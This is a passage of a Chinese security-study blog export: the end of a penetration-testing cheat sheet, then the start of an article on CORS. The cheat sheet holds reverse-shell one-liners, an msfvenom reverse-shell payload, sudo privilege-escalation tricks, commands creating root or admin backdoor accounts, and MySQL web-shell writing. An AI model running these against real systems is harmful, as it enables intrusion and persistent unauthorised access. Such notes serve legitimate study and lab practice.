class=\"line\">p=subprocess.call([<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"string\">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"第二种方式\"><a href=\"#第二种方式\" class=\"headerlink\" title=\"第二种方式\"></a>第二种方式</h5><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pty,socket;s=socket.socket();s.connect((<span class=\"string\">&quot;10.0.2.15&quot;</span>,<span class=\"number\">9001</span>));[os.dup2(s.fileno(),f)<span class=\"keyword\">for</span> f <span class=\"keyword\">in</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>)];pty.spawn(<span class=\"string\">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pty,socket</span><br><span class=\"line\">s=socket.socket()</span><br><span class=\"line\">s.connect((<span class=\"string\">&quot;10.0.2.15&quot;</span>,<span class=\"number\">9001</span>))</span><br><span class=\"line\">[os.dup2(s.fileno(),f)<span class=\"keyword\">for</span> f <span class=\"keyword\">in</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>)]</span><br><span class=\"line\">pty.spawn(<span class=\"string\">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"nc\"><a href=\"#nc\" class=\"headerlink\" title=\"nc\"></a>nc</h2><ul>\n<li>使用nc监听端口：<code>nc -lvnp 7777</code></li>\n<li>使用nc程序来传输二进制文件：<ul>\n<li>先在宿主机上运行：<code>nc -lp 9002 &gt; binFile</code>，binFile表示二进制文件</li>\n<li>然后在被监听的服务器上运行：<code>nc -w 3 you_ip[宿主机IP] 7778[Port] &lt; /usr/bin/binFile[二进制文件]</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"searchsploit的使用\"><a href=\"#searchsploit的使用\" class=\"headerlink\" title=\"searchsploit的使用\"></a>searchsploit的使用</h2><ul>\n<li>搜索内核版本：<code>searchsploit 4.4.0</code><br><img src=\"/images/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/image-20230606231153913.png\" alt=\"image-20230606231153913\"></li>\n</ul>\n<h2 id=\"提权\"><a href=\"#提权\" class=\"headerlink\" title=\"提权\"></a>提权</h2><p>参考文章：<a href=\"http://cn-sec.com/archives/260823.html\">http://cn-sec.com/archives/260823.html</a></p>\n<h3 id=\"SUID\"><a href=\"#SUID\" class=\"headerlink\" title=\"SUID\"></a>SUID</h3><ul>\n<li>查找SUID的二进制文件：<code>find / -perm -u=s -type f 2&gt;/dev/null</code></li>\n</ul>\n<h3 id=\"vim提权\"><a href=\"#vim提权\" class=\"headerlink\" title=\"vim提权\"></a>vim提权</h3><ul>\n<li><code>sudo /usr/bin/vim -c &#39;:!/bin/sh&#39;</code></li>\n</ul>\n<h3 id=\"pip提权\"><a href=\"#pip提权\" class=\"headerlink\" title=\"pip提权\"></a>pip提权</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">TF=$(mktemp -d)</span><br><span class=\"line\">echo <span class=\"string\">&quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot;</span> &gt; $TF/setup.py</span><br><span class=\"line\">sudo pip install $TF</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"traitor\"><a href=\"#traitor\" class=\"headerlink\" title=\"traitor\"></a>traitor</h3><blockquote>\n<p>介绍</p>\n</blockquote>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">几乎所有的GTFOBins</span><br><span class=\"line\">可写的docker.sock</span><br><span class=\"line\">CVE-2022-0847（脏管）</span><br><span class=\"line\">CVE-2021-4034（pwnkit）</span><br><span class=\"line\">CVE-2021-3560</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PEASS-ng\"><a href=\"#PEASS-ng\" class=\"headerlink\" title=\"PEASS-ng\"></a>PEASS-ng</h3><blockquote>\n<p>介绍</p>\n</blockquote>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">适用于 Windows 和 Linux/Unix* 以及 MacOS 的权限升级工具</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ltrace工具\"><a href=\"#ltrace工具\" class=\"headerlink\" title=\"ltrace工具\"></a>ltrace工具</h2><ul>\n<li>功能：是一个简单的程序，它将执行二进制文件直到或除非它退出。它将告诉我们所有库调用并拦截二进制文件进行的系统调用。</li>\n</ul>\n<h2 id=\"find\"><a href=\"#find\" class=\"headerlink\" title=\"find\"></a>find</h2><ul>\n<li>查找我们可以使用命令访问的文件：<code>find / -group administrators -type f 2&gt;/dev/null</code></li>\n</ul>\n<h2 id=\"tar命令\"><a href=\"#tar命令\" class=\"headerlink\" title=\"tar命令\"></a>tar命令</h2><ul>\n<li>压缩文件：<code>tar -czvf test.tar.gz test.txt</code></li>\n<li>解压文件：<code>tar -xzvf test.tar.gz</code></li>\n</ul>\n<h2 id=\"Linux添加用户命令\"><a href=\"#Linux添加用户命令\" class=\"headerlink\" title=\"Linux添加用户命令\"></a>Linux添加用户命令</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">先添加用户：useradd -g root -s /bin/bash -u 10010 test</span><br><span class=\"line\">将/etc/passwd中的UID修改为0：sed -i &quot;s/test:x:10010/test:x:0/g&quot; /etc/passwd</span><br><span class=\"line\">给用户test设置一个密码：echo &quot;test:sd123456&quot; | chpasswd</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"windows用户操作\"><a href=\"#windows用户操作\" class=\"headerlink\" title=\"windows用户操作\"></a>windows用户操作</h2><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">查看用户：net user</span><br><span class=\"line\">添加用户：net user name password /add，例如：net user monkey111 123456 /add</span><br><span class=\"line\">将此用户提升为管理员：net localgroup administrators monkey111 /add</span><br><span class=\"line\">查看所有管理员：net user administrators</span><br><span class=\"line\">删除账号：net user monkey111 /delete</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"fscan\"><a href=\"#fscan\" class=\"headerlink\" title=\"fscan\"></a>fscan</h2><p>常用命令参数如下：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">-c string</span><br><span class=\"line\">      ssh命令执行</span><br><span class=\"line\">-cookie string</span><br><span class=\"line\">      设置cookie</span><br><span class=\"line\">-debug int</span><br><span class=\"line\">      多久没响应,就打印当前进度(default 60)</span><br><span class=\"line\">-domain string</span><br><span class=\"line\">      smb爆破模块时,设置域名</span><br><span class=\"line\">-h string</span><br><span class=\"line\">      目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12</span><br><span class=\"line\">-hf string</span><br><span class=\"line\">      读取文件中的目标</span><br><span class=\"line\">-hn string</span><br><span class=\"line\">      扫描时,要跳过的ip: -hn 192.168.1.1/24</span><br><span class=\"line\">-m string</span><br><span class=\"line\">      设置扫描模式: -m ssh (default &quot;all&quot;)</span><br><span class=\"line\">-no</span><br><span class=\"line\">      扫描结果不保存到文件中</span><br><span class=\"line\">-nobr</span><br><span class=\"line\">      跳过sql、ftp、ssh等的密码爆破</span><br><span class=\"line\">-nopoc</span><br><span class=\"line\">      跳过web poc扫描</span><br><span class=\"line\">-np</span><br><span class=\"line\">      跳过存活探测</span><br><span class=\"line\">-num int</span><br><span class=\"line\">      web poc 发包速率  (default 20)</span><br><span class=\"line\">-o string</span><br><span class=\"line\">      扫描结果保存到哪 (default &quot;result.txt&quot;)</span><br><span class=\"line\">-p string</span><br><span class=\"line\">      设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default &quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;)</span><br><span class=\"line\">-pa string</span><br><span class=\"line\">      新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)</span><br><span class=\"line\">-path string</span><br><span class=\"line\">      fcgi、smb romote file path</span><br><span class=\"line\">-ping</span><br><span class=\"line\">      使用ping代替icmp进行存活探测</span><br><span class=\"line\">-pn string</span><br><span class=\"line\">      扫描时要跳过的端口,as: -pn 445</span><br><span class=\"line\">-pocname string</span><br><span class=\"line\">      指定web poc的模糊名字, -pocname weblogic</span><br><span class=\"line\">-proxy string</span><br><span class=\"line\">      设置代理, -proxy http://127.0.0.1:8080</span><br><span class=\"line\">-user string</span><br><span class=\"line\">      指定爆破时的用户名</span><br><span class=\"line\">-userf string</span><br><span class=\"line\">      指定爆破时的用户名文件</span><br><span class=\"line\">-pwd string</span><br><span class=\"line\">      指定爆破时的密码</span><br><span class=\"line\">-pwdf string</span><br><span class=\"line\">      指定爆破时的密码文件</span><br><span class=\"line\">-rf string</span><br><span class=\"line\">      指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)</span><br><span class=\"line\">-rs string</span><br><span class=\"line\">      redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)</span><br><span class=\"line\">-silent</span><br><span class=\"line\">      静默扫描,适合cs扫描时不回显</span><br><span class=\"line\">-sshkey string</span><br><span class=\"line\">      ssh连接时,指定ssh私钥</span><br><span class=\"line\">-t int</span><br><span class=\"line\">      扫描线程 (default 600)</span><br><span class=\"line\">-time int</span><br><span class=\"line\">      端口扫描超时时间 (default 3)</span><br><span class=\"line\">-u string</span><br><span class=\"line\">      指定Url扫描</span><br><span class=\"line\">-uf string</span><br><span class=\"line\">      指定Url文件扫描</span><br><span class=\"line\">-wt int</span><br><span class=\"line\">      web访问超时时间 (default 5)</span><br><span class=\"line\">-pocpath string</span><br><span class=\"line\">      指定poc路径</span><br><span class=\"line\">-usera string</span><br><span class=\"line\">      在原有用户字典基础上,新增新用户</span><br><span class=\"line\">-pwda string</span><br><span class=\"line\">      在原有密码字典基础上,增加新密码</span><br><span class=\"line\">-socks5</span><br><span class=\"line\">      指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)</span><br><span class=\"line\">-sc </span><br><span class=\"line\">      指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"wireshark\"><a href=\"#wireshark\" class=\"headerlink\" title=\"wireshark\"></a>wireshark</h2><h3 id=\"常用过滤器\"><a href=\"#常用过滤器\" class=\"headerlink\" title=\"常用过滤器\"></a>常用过滤器</h3><ul>\n<li>过滤所有的http请求包：<code>http.request</code></li>\n<li>过滤所有的http响应包：<code>http.response</code></li>\n<li>获取主机信息：<code>nbns</code></li>\n</ul>\n<h3 id=\"常见配置\"><a href=\"#常见配置\" class=\"headerlink\" title=\"常见配置\"></a>常见配置</h3><h4 id=\"配置显示域名对应的IP地址\"><a href=\"#配置显示域名对应的IP地址\" class=\"headerlink\" title=\"配置显示域名对应的IP地址\"></a>配置显示域名对应的IP地址</h4><p><code>编辑</code>-&gt;<code>首选项</code>-&gt;<code>Name Resolution</code>-&gt;勾选图中箭头所指处</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/image-20230611121714908.png\" alt=\"image-20230611121714908\"></p>\n<h4 id=\"快速获取列\"><a href=\"#快速获取列\" class=\"headerlink\" title=\"快速获取列\"></a>快速获取列</h4><p>右键要选择的列，添加到列</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/image-20230611122946330.png\" alt=\"image-20230611122946330\"></p>\n<p>然后可以修改名字，右键列顶栏，然后部署列</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/image-20230611123030886.png\" alt=\"image-20230611123030886\"></p>\n<p>可以进行修改</p>\n<p><img src=\"/images/%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/image-20230611123043959.png\" alt=\"image-20230611123043959\"></p>\n<h2 id=\"ffuf\"><a href=\"#ffuf\" class=\"headerlink\" title=\"ffuf\"></a>ffuf</h2><h3 id=\"常见命令参数\"><a href=\"#常见命令参数\" class=\"headerlink\" title=\"常见命令参数\"></a>常见命令参数</h3><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">-D\t与 -e 标志一起使用。用 -e 提供的每个扩展替换单词列表条目中的 %EXT%</span><br><span class=\"line\">-H \t&quot;名称:值&quot;</span><br><span class=\"line\">\t\t标头“名称：值”，以冒号分隔。接受多个 -H 标志</span><br><span class=\"line\">-V \t显示版本信息</span><br><span class=\"line\">-X string</span><br><span class=\"line\">\t\t使用的HTTP方法(默认为“GET”)</span><br><span class=\"line\">-ac\t自动校准过滤选项</span><br><span class=\"line\">-c\t着色输出</span><br><span class=\"line\">-d \tstring</span><br><span class=\"line\">\t\tPOST数据</span><br><span class=\"line\">-e \tstring</span><br><span class=\"line\">\t\t以逗号分隔的要应用的扩展名列表。提供的每个扩展都会扩展一次单词列表条目</span><br><span class=\"line\">-fc string</span><br><span class=\"line\">\t\t从响应中过滤 HTTP 状态代码</span><br><span class=\"line\">-fr string</span><br><span class=\"line\">\t\t过滤 HTTP 响应大小</span><br><span class=\"line\">-fw string</span><br><span class=\"line\">\t\t按响应中的字数过滤</span><br><span class=\"line\">-k \tTLS 身份验证</span><br><span class=\"line\">-mc string</span><br><span class=\"line\">\t\t匹配来自respose的HTTP状态码，使用“all”来匹配每一个响应码。 （默认“200,204,301,302,307,401,403”）</span><br><span class=\"line\">-mr string</span><br><span class=\"line\">\t\t匹配正则表达式</span><br><span class=\"line\">-ms string</span><br><span class=\"line\">\t\t匹配 HTTP 响应大小</span><br><span class=\"line\">-mw string</span><br><span class=\"line\">\t\t匹配响应中的字数</span><br><span class=\"line\">-o \tstring</span><br><span class=\"line\">\t\t将输出写入文件</span><br><span class=\"line\">-of\tstring</span><br><span class=\"line\">\t\t输出文件格式。可用格式：json、csv、ecsv（默认“json”）</span><br><span class=\"line\">-p \tdelay</span><br><span class=\"line\">\t\t请求之间的延迟秒数，或一系列随机延迟。例如“0.1”或“0.1-2.0”</span><br><span class=\"line\">-r\t跟随重定向</span><br><span class=\"line\">-s\t不打印附加信息（静默模式）</span><br><span class=\"line\">-sa\t停止所有错误情况。暗示 -sf 和 -se</span><br><span class=\"line\">-se\t停止虚假错误</span><br><span class=\"line\">-sf\t当 &gt; 95% 的响应返回 403 Forbidden 时停止</span><br><span class=\"line\">-t int</span><br><span class=\"line\">\t\t并发线程数(默认40)</span><br><span class=\"line\">-timeout int</span><br><span class=\"line\">\t\tHTTP 请求超时秒数。 （默认 10）</span><br><span class=\"line\">-u string</span><br><span class=\"line\">\t\t目标网址</span><br><span class=\"line\">-w string</span><br><span class=\"line\">\t\t字典路径</span><br><span class=\"line\">-x string</span><br><span class=\"line\">\t\tHTTP 代理网址</span><br><span class=\"line\">-ic\t忽略wordlist注释(默认值:false)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Linux其他常见知识点\"><a href=\"#Linux其他常见知识点\" class=\"headerlink\" title=\"Linux其他常见知识点\"></a>Linux其他常见知识点</h2><ul>\n<li>后台运行程序：<ul>\n<li><code>command &gt; out.file 2&gt;&amp;1 &amp;</code></li>\n<li><code>nohup command &gt; myout.file 2&gt;&amp;1 &amp;</code></li>\n<li><code>nohup command &amp;</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"enum4linux\"><a href=\"#enum4linux\" class=\"headerlink\" title=\"enum4linux\"></a>enum4linux</h2><ul>\n<li>该工具的主要作用：用于枚举Windows和Samba主机中的数据</li>\n</ul>\n<h3 id=\"常见配置参数\"><a href=\"#常见配置参数\" class=\"headerlink\" title=\"常见配置参数\"></a>常见配置参数</h3><p>参考文章链接：<a href=\"https://hackfun.org/2016/10/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Benum4linux/\">https://hackfun.org/2016/10/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Benum4linux/</a></p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">用法: enum4linux [选项] ip地址</span><br><span class=\"line\"></span><br><span class=\"line\">枚举选项：</span><br><span class=\"line\">     -U        获取用户列表</span><br><span class=\"line\">     -M        获取机器列表*</span><br><span class=\"line\">     -S        获取共享列表</span><br><span class=\"line\">     -P        获取密码策略信息</span><br><span class=\"line\">     -G        获取组和成员列表</span><br><span class=\"line\">     -d        详述适用于-U和-S</span><br><span class=\"line\">     -u user   用户指定要使用的用户名（默认&quot;&quot;）</span><br><span class=\"line\">     -p pass   指定要使用的密码（默认为&quot;&quot;）</span><br><span class=\"line\">     </span><br><span class=\"line\">其他选项:</span><br><span class=\"line\">    -a        做所有简单枚举（-U -S -G -P -r -o -n -i），如果您没有提供任何其他选项，则启用此选项</span><br><span class=\"line\">    -h        显示此帮助消息并退出</span><br><span class=\"line\">    -r        通过RID循环枚举用户</span><br><span class=\"line\">    -R range  RID范围要枚举（默认值：500-550,1000-1050，隐含-r）</span><br><span class=\"line\">    -K n      继续搜索RID，直到n个连续的RID与用户名不对应，Impies RID范围结束于999999.对DC有用</span><br><span class=\"line\">    -l        通过LDAP 389 / TCP获取一些（有限的）信息（仅适用于DN）</span><br><span class=\"line\">    -s        文件暴力猜测共享名称</span><br><span class=\"line\">    -k user   远程系统上存在的用户（默认值：administrator，guest，krbtgt，domain admins，root，bin，none）</span><br><span class=\"line\">              用于获取sid与“lookupsid known_username”</span><br><span class=\"line\">              使用逗号尝试几个用户：“-k admin，user1，user2”</span><br><span class=\"line\">    -o        获取操作系统信息</span><br><span class=\"line\">    -i        获取打印机信息</span><br><span class=\"line\">    -w wrkg   手动指定工作组（通常自动找到）</span><br><span class=\"line\">    -n        做一个nmblookup（类似于nbtstat）</span><br><span class=\"line\">    -v        详细输出，显示正在运行的完整命令（net，rpcclient等）</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"msf\"><a href=\"#msf\" class=\"headerlink\" title=\"msf\"></a>msf</h2><h3 id=\"msfvenom\"><a href=\"#msfvenom\" class=\"headerlink\" title=\"msfvenom\"></a>msfvenom</h3><ul>\n<li>生成war格式木马：<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.2.15 LPORT=7777 -f war -o revshell.war</code></li>\n</ul>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><h3 id=\"MySQL\"><a href=\"#MySQL\" class=\"headerlink\" title=\"MySQL\"></a>MySQL</h3><h4 id=\"MySQL日志shell\"><a href=\"#MySQL日志shell\" class=\"headerlink\" title=\"MySQL日志shell\"></a>MySQL日志shell</h4><figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">查看日志是否开启：show variables like &quot;%general%&quot;</span><br><span class=\"line\">打开日志读写功能：set global general_log=&#x27;on&#x27;</span><br><span class=\"line\">设置日志存储文件：set global general_log_file=&quot;C:/phpStudy/WWW/monkey111.php&quot;</span><br><span class=\"line\">进行查询写shell：select &quot;&lt;?php phpinfo();?&gt;&quot;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"MySQL写shell\"><a href=\"#MySQL写shell\" class=\"headerlink\" title=\"MySQL写shell\"></a>MySQL写shell</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">查看系统变量：SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br><span class=\"line\">\t如果为null的话，就是没有设置允许操作的目录，所以没法导出到文件</span><br><span class=\"line\">\t如果为具体的目录，则可以考虑导出到指定目录，或者从指定目录导出</span><br><span class=\"line\">\t如果变量值为空，则可以使用任意目录</span><br></pre></td></tr></table></figure>\n\n","categories":["web安全学习"],"tags":["web","安全"]},{"title":"跨域资源共享CORS和JSONP","url":"/2023/08/03/%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E5%92%8CJSONP/","content":"<p>原文链接：<a href=\"https://www.ruanyifeng.com/blog/2016/04/cors.html\">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>\n<p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。</p>\n<p>它允许浏览器向跨源服务器，发出<a href=\"https://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html\"><code>XMLHttpRequest</code></a>请求，从而克服了AJAX只能<a href=\"https://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html\">同源</a>使用的限制。</p>\n<p>本文详细介绍CORS的内部机制。</p>\n<h2 id=\"一、简介\"><a href=\"#一、简介\" class=\"headerlink\" title=\"一、简介\"></a>一、简介</h2><p>CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。</p>\n<p>整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p>\n<p>因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。</p>\n<h2 id=\"二、两种请求\"><a href=\"#二、两种请求\" class=\"headerlink\" title=\"二、两种请求\"></a>二、两种请求</h2><p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>\n<p>只要同时满足以下两大条件，就属于简单请求。</p>\n<blockquote>\n<p>请求方法是以下三种方法之一：</p>\n</blockquote>\n<ul>\n<li>HEAD</li>\n<li>GET</li>\n<li>POST</li>\n</ul>\n<blockquote>\n<p>HTTP的头信息不超出以下几种字段：</p>\n</blockquote>\n<ul>\n<li>Accept</li>\n<li>Accept-Language</li>\n<li>Content-Language</li>\n<li>Last-Event-ID</li>\n<li>Content-Type：只限于三个值<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code></li>\n</ul>\n<p>这是为了兼容表单（form），因为历史上表单一直可以发出跨域请求。AJAX 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。</p>\n<p>凡是不同时满足上面两个条件，就属于非简单请求。</p>\n<p>浏览器对这两种请求的处理，是不一样的。</p>\n<h2 id=\"三、简单请求\"><a href=\"#三、简单请求\" class=\"headerlink\" title=\"三、简单请求\"></a>三、简单请求</h2><h3 id=\"3-1-基本流程\"><a href=\"#3-1-基本流程\" class=\"headerlink\" title=\"3.1 基本流程\"></a>3.1 基本流程</h3><p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个<code>Origin</code>字段。</p>\n<p>下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个<code>Origin</code>字段。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /cors HTTP/1.1</span><br><span class=\"line\">Origin: http://api.bob.com</span><br><span class=\"line\">Host: api.alice.com</span><br><span class=\"line\">Accept-Language: en-US</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure>\n\n<p>上面的头信息中，<code>Origin</code>字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p>\n<p>如果<code>Origin</code>指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含<code>Access-Control-Allow-Origin</code>字段（详见下文），就知道出错了，从而抛出一个错误，被<code>XMLHttpRequest</code>的<code>onerror</code>回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p>\n<p>如果<code>Origin</code>指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class=\"line\">Access-Control-Allow-Credentials: true</span><br><span class=\"line\">Access-Control-Expose-Headers: FooBar</span><br><span class=\"line\">Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure>\n\n<p>上面的头信息之中，有三个与CORS请求相关的字段，都以<code>Access-Control-</code>开头。</p>\n<blockquote>\n<p><strong>Access-Control-Allow-Origin</strong></p>\n</blockquote>\n<p>该字段是必须的。它的值要么是请求时<code>Origin</code>字段的值，要么是一个<code>*</code>，表示接受任意域名的请求。</p>\n<blockquote>\n<p><strong>Access-Control-Allow-Credentials</strong></p>\n</blockquote>\n<p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为<code>true</code>，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为<code>true</code>，如果服务器不要浏览器发送Cookie，删除该字段即可。</p>\n<blockquote>\n<p><strong>Access-Control-Expose-Headers</strong></p>\n</blockquote>\n<p>该字段可选。CORS请求时，<code>XMLHttpRequest</code>对象的<code>getResponseHeader()</code>方法只能拿到6个基本字段：<code>Cache-Control</code>、<code>Content-Language</code>、<code>Content-Type</code>、<code>Expires</code>、<code>Last-Modified</code>、<code>Pragma</code>。如果想拿到其他字段，就必须在<code>Access-Control-Expose-Headers</code>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回<code>FooBar</code>字段的值。</p>\n<h3 id=\"3-2-withCredentials-属性\"><a href=\"#3-2-withCredentials-属性\" class=\"headerlink\" title=\"3.2 withCredentials 属性\"></a>3.2 withCredentials 属性</h3><p>上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定<code>Access-Control-Allow-Credentials</code>字段。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>\n\n<p>另一方面，开发者必须在AJAX请求中打开<code>withCredentials</code>属性。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">var xhr = new XMLHttpRequest();</span><br><span class=\"line\">xhr.withCredentials = true;</span><br></pre></td></tr></table></figure>\n\n<p>否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。</p>\n<p>但是，如果省略<code>withCredentials</code>设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭<code>withCredentials</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">xhr.withCredentials = false;</span><br></pre></td></tr></table></figure>\n\n<p>需要注意的是，如果要发送Cookie，<code>Access-Control-Allow-Origin</code>就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的<code>document.cookie</code>也无法读取服务器域名下的Cookie。</p>\n<h2 id=\"四、非简单请求\"><a href=\"#四、非简单请求\" class=\"headerlink\" title=\"四、非简单请求\"></a>四、非简单请求</h2><h3 id=\"4-1-预检请求\"><a href=\"#4-1-预检请求\" class=\"headerlink\" title=\"4.1 预检请求\"></a>4.1 预检请求</h3><p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是<code>PUT</code>或<code>DELETE</code>，或者<code>Content-Type</code>字段的类型是<code>application/json</code>。</p>\n<p>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。</p>\n<p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的<code>XMLHttpRequest</code>请求，否则就报错。</p>\n<p>下面是一段浏览器的JavaScript脚本。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"string\">&#x27;http://api.alice.com/cors&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>();</span><br><span class=\"line\">xhr.<span class=\"title function_\">open</span>(<span class=\"string\">&#x27;PUT&#x27;</span>, url, <span class=\"literal\">true</span>);</span><br><span class=\"line\">xhr.<span class=\"title function_\">setRequestHeader</span>(<span class=\"string\">&#x27;X-Custom-Header&#x27;</span>, <span class=\"string\">&#x27;value&#x27;</span>);</span><br><span class=\"line\">xhr.<span class=\"title function_\">send</span>();</span><br></pre></td></tr></table></figure>\n\n<p>上面代码中，HTTP请求的方法是<code>PUT</code>，并且发送一个自定义头信息<code>X-Custom-Header</code>。</p>\n<p>浏览器发现，这是一个非简单请求，就自动发出一个”预检”请求，要求服务器确认可以这样请求。下面是这个”预检”请求的HTTP头信息。</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">OPTIONS /cors HTTP/1.1</span><br><span class=\"line\">Origin: http://api.bob.com</span><br><span class=\"line\">Access-Control-Request-Method: PUT</span><br><span class=\"line\">Access-Control-Request-Headers: X-Custom-Header</span><br><span class=\"line\">Host: api.alice.com</span><br><span class=\"line\">Accept-Language: en-US</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">User-Agent: 